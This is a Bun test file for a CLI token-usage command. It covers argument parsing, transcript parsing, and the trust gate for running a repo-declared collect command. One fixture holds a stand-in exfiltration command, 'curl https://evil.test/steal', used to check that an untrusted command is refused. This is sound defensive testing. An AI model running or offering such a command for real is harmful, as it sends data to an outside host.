import { describe, expect, it } from 'bun:test'
import { buildTokensResult, parseArgs, parseDeclaredCollectOutput, runTrustCollect } from '../src/commands/tokens'
import type { TokensDeps } from '../src/commands/tokens'

function assistantLine(opts: { id: string; model: string; input: number; output: number }): string {
  return JSON.stringify({
    type: 'assistant',
    message: {
      id: opts.id,
      model: opts.model,
      usage: { input_tokens: opts.input, output_tokens: opts.output }
    }
  })
}

function fakeDeps(overrides: Partial<TokensDeps> = {}): TokensDeps {
  return {
    env: {},
    cwd: '/repo',
    exists: () => false,
    readFile: () => {
      throw new Error('unexpected readFile call')
    },
    loadConfig: () => null,
    runCollectCommand: () => {
      throw new Error('unexpected runCollectCommand call')
    },
    warn: () => {},
    gitCommonDir: () => '/repo/.git',
    isCollectTrusted: () => true,
    trustCollect: () => {
      throw new Error('unexpected trustCollect call')
    },
    ...overrides
  }
}

describe('parseArgs', () => {
  it('requires --phase and --role', () => {
    expect(() => parseArgs(['--phase', '1: develop'])).toThrow()
    expect(() => parseArgs(['--role', 'Developer'])).toThrow()
  })

  it('parses phase/role/model/transcript', () => {
    const parsed = parseArgs([
      '--phase',
      '1: develop',
      '--role',
      'Developer',
      '--model',
      'claude-sonnet-5',
      '--transcript',
      '/tmp/x.jsonl'
    ])
    expect(parsed).toEqual({
      phase: '1: develop',
      role: 'Developer',
      model: 'claude-sonnet-5',
      transcriptPath: '/tmp/x.jsonl',
      tokensIn: undefined,
      tokensOut: undefined
    })
  })

  it('parses --in/--out as numbers', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer', '--in', '100', '--out', '50'])
    expect(parsed.tokensIn).toBe(100)
    expect(parsed.tokensOut).toBe(50)
  })

  it('refuses --in without --out and vice versa', () => {
    expect(() => parseArgs(['--phase', 'p', '--role', 'r', '--in', '10'])).toThrow()
    expect(() => parseArgs(['--phase', 'p', '--role', 'r', '--out', '10'])).toThrow()
  })

  it('refuses a negative or non-numeric --in', () => {
    expect(() => parseArgs(['--phase', 'p', '--role', 'r', '--in', '-1', '--out', '1'])).toThrow()
    expect(() => parseArgs(['--phase', 'p', '--role', 'r', '--in', 'nope', '--out', '1'])).toThrow()
  })
})

describe('buildTokensResult — manual entry', () => {
  it('renders --in/--out directly, never touching transcript resolution', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer', '--in', '100', '--out', '50'])
    const result = buildTokensResult(parsed, fakeDeps())
    expect(result.line).toBe('Tokens: 1: develop — Developer — — — 100/50/—')
  })

  it('honors --model as the model override for manual entry', () => {
    const parsed = parseArgs([
      '--phase',
      '1: develop',
      '--role',
      'Developer',
      '--model',
      'claude-sonnet-5',
      '--in',
      '10',
      '--out',
      '5'
    ])
    const result = buildTokensResult(parsed, fakeDeps())
    expect(result.line).toBe('Tokens: 1: develop — Developer — claude-sonnet-5 — 10/5/—')
  })
})

describe('buildTokensResult — transcript route', () => {
  it('prints a real Tokens: line from a resolvable explicit transcript', () => {
    const jsonl = assistantLine({ id: 'msg_1', model: 'claude-sonnet-5', input: 10, output: 5 })
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer', '--transcript', '/tmp/real.jsonl'])
    const result = buildTokensResult(parsed, fakeDeps({ exists: () => true, readFile: () => jsonl }))
    expect(result.line).toBe('Tokens: 1: develop — Developer — claude-sonnet-5 — 10/5/—')
    expect(result.breakdown).toBeDefined()
  })

  it('refuses rather than emitting 0/0/— when the transcript is empty', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer', '--transcript', '/tmp/empty.jsonl'])
    expect(() => buildTokensResult(parsed, fakeDeps({ exists: () => true, readFile: () => '' }))).toThrow(
      /transcript-empty/
    )
  })

  it('refuses with a clear message when no transcript resolves at all', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
    expect(() => buildTokensResult(parsed, fakeDeps())).toThrow(/no-transcript-resolved/)
  })
})

describe('buildTokensResult — declared tokens.collect route', () => {
  it('prefers the declared command over the transcript route, with no transcript present anywhere', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
    const payload = JSON.stringify({
      inputTokens: 120,
      outputTokens: 40,
      cacheCreationInputTokens: 5,
      cacheReadInputTokens: 3,
      model: 'grok-5'
    })
    const result = buildTokensResult(
      parsed,
      fakeDeps({
        loadConfig: () => ({ tokens: { collect: './scripts/collect-usage.sh' } }),
        runCollectCommand: () => payload
      })
    )
    expect(result.line).toBe('Tokens: 1: develop — Developer — grok-5 — 128/40/—')
    expect(result.breakdown).toBeDefined()
  })

  it('announces the exact declared command via warn() before running it — security review, PR #303', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
    const events: string[] = []
    buildTokensResult(
      parsed,
      fakeDeps({
        loadConfig: () => ({ tokens: { collect: 'curl https://example.test/usage' } }),
        runCollectCommand: (command) => {
          events.push(`ran: ${command}`)
          return JSON.stringify({
            inputTokens: 1,
            outputTokens: 1,
            cacheCreationInputTokens: 0,
            cacheReadInputTokens: 0
          })
        },
        warn: (message) => events.push(`warned: ${message}`)
      })
    )
    expect(events[0]).toContain('warned:')
    expect(events[0]).toContain('curl https://example.test/usage')
    expect(events[1]).toBe('ran: curl https://example.test/usage')
  })

  it('falls back to the transcript route unchanged when tokens.collect is absent', () => {
    const jsonl = assistantLine({ id: 'msg_1', model: 'claude-sonnet-5', input: 10, output: 5 })
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer', '--transcript', '/tmp/real.jsonl'])
    const result = buildTokensResult(
      parsed,
      fakeDeps({ loadConfig: () => null, exists: () => true, readFile: () => jsonl })
    )
    expect(result.line).toBe('Tokens: 1: develop — Developer — claude-sonnet-5 — 10/5/—')
  })

  it('fails loudly when the declared command exits non-zero, never falling back to the transcript route', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
    expect(() =>
      buildTokensResult(
        parsed,
        fakeDeps({
          loadConfig: () => ({ tokens: { collect: 'exit 1' } }),
          runCollectCommand: () => {
            throw new Error('Command failed: exit 1')
          }
        })
      )
    ).toThrow(/declared tokens\.collect command "exit 1" failed/)
  })

  it('fails loudly on unparseable output rather than producing zeros', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
    expect(() =>
      buildTokensResult(
        parsed,
        fakeDeps({
          loadConfig: () => ({ tokens: { collect: './garbage.sh' } }),
          runCollectCommand: () => 'not json at all'
        })
      )
    ).toThrow(/did not print valid JSON/)
  })

  it('refuses — never executes, never falls back — an untrusted declared command (security review, PR #303, round 2)', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
    expect(() =>
      buildTokensResult(
        parsed,
        fakeDeps({
          loadConfig: () => ({ tokens: { collect: 'curl https://evil.test/steal' } }),
          isCollectTrusted: () => false,
          runCollectCommand: () => {
            throw new Error('must not run an untrusted command')
          }
        })
      )
    ).toThrow(/not yet trusted on this machine/)
  })

  it('refuses when the repo git identity cannot be resolved, rather than trusting blindly', () => {
    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
    expect(() =>
      buildTokensResult(
        parsed,
        fakeDeps({
          loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
          gitCommonDir: () => null,
          isCollectTrusted: () => {
            throw new Error('must not check trust when identity is unresolvable')
          },
          runCollectCommand: () => {
            throw new Error('must not run when identity is unresolvable')
          }
        })
      )
    ).toThrow(/git common directory could not be resolved/)
  })
})

describe('runTrustCollect', () => {
  it('records approval and returns the trusted command', () => {
    const calls: Array<[string, string]> = []
    const outcome = runTrustCollect(
      fakeDeps({
        loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
        gitCommonDir: () => '/repo/.git',
        trustCollect: (dir, command) => calls.push([dir, command])
      })
    )
    expect(outcome).toEqual({ ok: true, command: 'echo hi' })
    expect(calls).toEqual([['/repo/.git', 'echo hi']])
  })

  it('refuses when no tokens.collect is declared — nothing to trust', () => {
    const outcome = runTrustCollect(fakeDeps({ loadConfig: () => null }))
    expect(outcome).toEqual({ ok: false, message: expect.stringContaining('nothing to trust') })
  })

  it('refuses when the repo git identity cannot be resolved, rather than trusting blindly', () => {
    const outcome = runTrustCollect(
      fakeDeps({
        loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
        gitCommonDir: () => null,
        trustCollect: () => {
          throw new Error('must not trust when identity is unresolvable')
        }
      })
    )
    expect(outcome).toEqual({ ok: false, message: expect.stringContaining('could not be resolved') })
  })
})

describe('parseDeclaredCollectOutput', () => {
  it('parses a valid payload into the TranscriptSummary shape', () => {
    const summary = parseDeclaredCollectOutput(
      JSON.stringify({
        inputTokens: 1,
        outputTokens: 2,
        cacheCreationInputTokens: 3,
        cacheReadInputTokens: 4,
        model: 'grok-5'
      }),
      'cmd'
    )
    expect(summary).toEqual({
      components: { inputTokens: 1, outputTokens: 2, cacheCreationInputTokens: 3, cacheReadInputTokens: 4 },
      model: 'grok-5',
      messageCount: 1
    })
  })

  it('defaults model to null when absent', () => {
    const summary = parseDeclaredCollectOutput(
      JSON.stringify({ inputTokens: 1, outputTokens: 2, cacheCreationInputTokens: 0, cacheReadInputTokens: 0 }),
      'cmd'
    )
    expect(summary.model).toBeNull()
  })

  it('rejects invalid JSON', () => {
    expect(() => parseDeclaredCollectOutput('not json', 'cmd')).toThrow(/did not print valid JSON/)
  })

  it('rejects a JSON array', () => {
    expect(() => parseDeclaredCollectOutput('[1,2,3]', 'cmd')).toThrow(/not an object/)
  })

  it('rejects a missing usage field', () => {
    expect(() =>
      parseDeclaredCollectOutput(
        JSON.stringify({ outputTokens: 2, cacheCreationInputTokens: 0, cacheReadInputTokens: 0 }),
        'cmd'
      )
    ).toThrow(/invalid "inputTokens"/)
  })

  it('rejects a negative usage field', () => {
    expect(() =>
      parseDeclaredCollectOutput(
        JSON.stringify({ inputTokens: -1, outputTokens: 2, cacheCreationInputTokens: 0, cacheReadInputTokens: 0 }),
        'cmd'
      )
    ).toThrow(/invalid "inputTokens"/)
  })

  it('rejects a non-string model', () => {
    expect(() =>
      parseDeclaredCollectOutput(
        JSON.stringify({
          inputTokens: 1,
          outputTokens: 2,
          cacheCreationInputTokens: 0,
          cacheReadInputTokens: 0,
          model: 42
        }),
        'cmd'
      )
    ).toThrow(/non-string "model"/)
  })
})
